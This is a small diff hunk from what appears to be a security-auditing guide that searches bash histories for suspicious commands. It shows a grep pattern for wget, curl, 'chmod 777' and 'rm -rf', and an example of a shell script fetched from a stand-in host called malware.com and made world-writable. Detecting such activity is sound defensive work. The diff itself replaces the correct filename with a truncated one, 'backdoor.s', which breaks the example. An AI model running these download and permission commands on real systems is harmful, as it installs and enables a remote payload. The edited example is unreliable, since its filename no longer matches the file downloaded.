@@ -213,6 +213,5 @@ grep -E "wget|curl|chmod 777|rm -rf" /home/*/.bash_history
 Example:
 
 wget http://malware.com/backdoor.sh
-chmod 777 backdoor.sh
-
+chmod 777 backdoor.s
 This could indicate malware installation.
